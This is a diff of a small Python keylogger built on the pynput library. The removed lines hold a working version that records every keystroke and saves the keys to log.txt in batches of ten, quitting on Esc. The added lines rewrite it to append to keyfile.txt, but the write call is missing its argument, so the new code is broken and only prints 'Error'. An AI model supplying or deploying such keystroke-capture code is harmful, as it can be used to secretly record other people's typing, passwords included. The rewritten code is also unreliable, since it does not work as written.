@@ -1,38 +1,19 @@
-import pynput
-
-from pynput.keyboard import Key, Listener
+#Please run the code on VS Code instead of PyCharm. VS Code works perfectly.
 
 
-count = 0
-keys = []
+from pynput import keyboard
 
+def keypressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write()
+        except:
+            print("Error")
 
-def on_press(key):
-    global keys, count
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keypressed)
+    listener.start()
+    input()
 
-    keys.append(key)
-    count+=1
-    print("{} pressed".format(key))
-
-    if count>=10:
-        count = 0
-        write_file(keys)
-        keys = []
-
-
-def write_file(keys):
-    with open("log.txt", "w") as f:
-        for key in keys:
-            k = str(key).replace("'","")
-            if k.find("space")>0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k)
-
-def on_release(key):
-    if key==Key.esc:
-        return False
-
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
